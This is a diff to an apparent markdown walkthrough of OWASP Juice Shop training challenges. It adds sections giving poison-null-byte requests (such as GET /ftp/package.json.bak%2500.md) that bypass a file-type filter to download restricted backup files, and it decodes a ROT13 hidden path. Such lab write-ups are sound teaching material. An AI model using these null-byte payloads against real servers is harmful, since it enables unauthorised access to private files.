@@ -222,13 +222,19 @@ Content-Type: application/json<br>
 ### Easter Egg
 ### Nested Easter Egg
 ### Poison Null Byte 
-http://localhost:3000/ftp
-GET /ftp/eastere.gg%2500.md HTTP/1.1
-/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt
-online Caesar ciper: /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
+http://localhost:3000/ftp<br>
+GET /ftp/eastere.gg%2500.md HTTP/1.1<br>
+/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt<br>
+online Caesar ciper: /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg<br>
 
+### Forgoteen Sales Backup
+http://localhost:3000/ftp<br>
+GET /ftp/coupons_2013.md.bak%2500.md HTTP/1.1<br>
 
-
+### Misplaced Signature File 
+http://localhost:3000/ftp<br>
+GET /ftp/package.json.bak%2500.md HTTP/1.1<br>
+GET /ftp/suspicious_errors.yml%2500.md HTTP/1.1<br>
 
 
 
